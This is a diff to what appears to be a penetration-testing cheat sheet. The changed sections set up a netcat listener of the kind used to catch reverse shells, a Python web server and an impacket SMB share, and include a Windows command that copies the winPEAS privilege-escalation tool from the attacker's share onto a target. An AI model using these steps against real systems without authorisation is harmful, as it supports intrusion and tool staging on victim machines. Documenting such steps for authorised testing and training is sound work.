@@ -8,16 +8,21 @@ pin: false
 
 ## Start listener
 
-```console
-# For Linux
-sudo nc -nvlp 4444
+### For Linux
 
-# For Windows
-sudo rlwrap nc -nvlp 443
-```
+	sudo nc -nvlp 4444
 
-## Listening web service
+### For Windows
 
-```console
-sudo python3 -m http.server 80
-```
+	sudo rlwrap nc -nvlp 443
+
+### Web service
+
+	sudo python3 -m http.server 80
+
+### SMB service with python impacket
+
+	sudo smbserver.py share . -smb2support
+	# Use it
+	copy \\<local_ip>\share\winPEAS.exe .
+
